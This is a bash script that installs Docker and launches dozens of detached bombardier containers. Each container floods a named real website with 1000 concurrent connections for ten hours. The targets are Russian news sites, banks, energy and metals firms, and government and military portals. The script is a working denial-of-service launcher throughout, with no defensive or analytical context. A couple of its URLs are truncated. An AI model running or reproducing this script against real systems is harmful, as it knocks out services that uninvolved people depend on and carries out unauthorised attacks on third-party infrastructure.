#!/bin/bash

yum update -y
yum install -y docker
systemctl restart docker

docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://ria.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://gazeta.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://kp.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://riafan.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://pikabu.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://kommersant.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://mk.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://yaplakal.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://rbc.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://bezformata.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://broker.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.tinkoff.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.gosuslugi.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://epp.genproc.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://ach.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.scrf.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://mil.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.gosuslugi.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.gazprom.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://lukoil.r
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://magnit.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.nornickel.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.surgutneftegas.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.tatneft.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.evraz.com/ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://nlmk.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.sibur.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.severstal.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.metalloinvest.com
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://nangs.org
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://rmk-group.ru/ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.tmk-group.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://ya.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.polymetalinternational.com/ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.uralkali.com/ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.eurosib.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://omk.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.sberbank.r
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.vtb.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.gazprombank.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.gosuslugi.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.mos.ru/uslugi
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://mil.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://www.nalog.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://customs.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://pfr.gov.ru
docker run -d --rm alpine/bombardier -c 1000 -d 36000s -l https://rkn.gov.ru
